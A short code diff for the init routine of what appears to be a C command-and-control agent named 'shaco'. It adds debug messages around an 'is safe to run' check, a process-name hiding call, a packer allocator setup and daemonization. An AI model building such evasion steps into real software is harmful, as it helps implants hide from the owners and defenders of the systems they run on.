@@ -28,8 +28,13 @@ bool shaco_init(char *argv[]){
     MSG("Checking if is safe to run");
     if(!is_safe_to_run()) { MSG("Is not safe to run"); return false;}
 
+    MSG("change process name");
     hide_process(argv);
+
+    MSG("change allocation function for packer");
     packer_set_alloc_func(shaco_malloc, shaco_realloc, shaco_free);
+
+    MSG("daemonize");
     daemonize();
 
     PSETTINGS ps = get_settings();
@@ -38,7 +43,7 @@ bool shaco_init(char *argv[]){
 #else
     ps->agent_id = 0;
 #endif
-
+    MSG("Agent ID: %d", ps->agent_id);
     return true;
 }
 
